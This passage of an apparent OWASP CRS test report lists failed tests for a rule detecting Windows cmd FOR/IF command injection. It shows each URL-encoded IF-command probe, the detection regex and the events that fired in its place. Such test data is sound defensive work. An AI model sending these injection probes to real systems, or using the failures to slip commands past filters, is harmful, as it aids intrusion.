            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+%22%251%22+%3D%3D+%22%22+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 143,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 143,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+%7B%251%7D+%3D%3D+%7B%7D",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 144,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932240 - Remote Command Execution: Unix Command Injection evasion attempt detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942180 - Detects basic SQL authentication bypass attempts 1/3", "phase=2 rule_id=942310 - Detects chained SQL injection attempts 2/2", "phase=2 rule_id=942330 - Detects classic SQL injection probings 1/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 144,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+%22A%251%22+%3D%3D+%22A%22+%28",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 145,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942490 - Detects classic SQL injection probings 3/3", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 145,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+DEFINED+ARG+%28echo+%22It+is+defined%3A+%251%22%29+ELSE+%28echo+%22%25%251+is+not+defined%22%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 147,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 147,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+a%3D%3Db+foo",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
